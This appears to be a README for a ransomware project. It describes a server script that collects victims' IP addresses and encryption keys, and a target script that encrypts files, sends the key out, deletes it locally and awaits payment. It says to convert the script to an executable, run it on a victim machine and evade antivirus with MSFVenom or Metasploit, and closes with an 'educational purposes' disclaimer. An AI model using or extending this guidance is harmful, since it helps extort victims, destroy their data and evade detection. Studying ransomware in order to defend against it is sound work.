Ransomware
	server-
		server.py - listens for the target to run ransomware.py and recieves key stores ip in a dataframe
	target-
		ransomware.py - encrypts files, sends key and deletes after, listens for payment verif.
		
convert to .exe and run on victim machine

serverside client for ransomware

Anti Virus evasion can be implemented with MSFVenom or metasploit framwork for client side executables

usage: python server.py <optional argument1: botnet.csv>

the server side script saves ip addresses their keys and states in a dataframe which is exported to csv upon exit

"resume" by including csv file argument

This is for purely for educational purposes, not to be used in any malicious or illegal manner.
The intent of this repository is to educate about how ransomware works and how it is created.